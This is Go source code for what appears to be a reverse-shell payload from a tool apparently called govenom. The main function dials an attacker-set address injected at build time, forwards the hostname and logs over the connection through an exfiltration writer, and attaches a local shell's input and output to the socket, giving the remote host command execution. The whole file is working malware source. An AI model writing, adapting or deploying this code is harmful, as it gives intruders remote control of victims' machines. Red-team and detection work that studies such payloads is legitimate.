package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"time"

	"govenom/exfilwriter"
)

var (
	// set during compilation/linking via -X ldflag
	address      string
	network      string
	exfilCfg     string
	exfilTimeout string
	noWindowsGui string // nolint:varcheck,go-lint
	shell        string
)

func determineShellCommand(prioritizedChoices [][]string) (shell string, args []string, err error) {
	candidates, err := buildShellCommandList(prioritizedChoices...)
	if err != nil {
		return "", nil, fmt.Errorf("getting shell command suggestions: %v", err)
	}

	for _, candidate := range candidates {
		if len(candidate) == 0 {
			continue
		}

		_, err := exec.LookPath(candidate[0])
		if err != nil {
			continue
		}

		return candidate[0], candidate[1:], nil
	}

	return "", nil, fmt.Errorf("could not find any existing shell binary")
}

func attachShell(con net.Conn, shellBinary string, args ...string) error {
	cmd := exec.Command(shellBinary, args...)
	cmd.SysProcAttr = getSysProcAttr()
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con

	err := cmd.Start()
	if err != nil {
		return fmt.Errorf("execute shell: %v", err)
	}

	err = cmd.Wait()
	if err != nil {
		return fmt.Errorf("shell died: %v", err)
	}

	return nil
}

func main() {
	timeout := 3 * time.Second
	if exfilTimeout != "" {
		dt, err := time.ParseDuration(exfilTimeout)
		if err == nil {
			timeout = dt
		}
	}

	w, errs := exfilwriter.New(exfilCfg, timeout)
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	log := log.New(w, fmt.Sprintf("%s: ", hostname), 0)

	conn, err := net.Dial(network, address)
	if err != nil {
		log.Fatal(err.Error())
	}

	defer conn.Close()

	w.AddExfiltrator(conn)

	// send out debuglog configuration errors *at least* over TCP
	if len(errs) > 0 {
		for _, err := range errs {
			log.Println(err)
		}
	}

	shellBinary, args, err := determineShellCommand([][]string{{shell}})
	if err != nil {
		log.Fatal(err)
	}

	log.Printf("Using Shell: %s\n", shellBinary)

	err = attachShell(conn, shellBinary, args...)
	if err != nil {
		log.Fatal(err)
	}

	log.Println("Shell terminated")
}
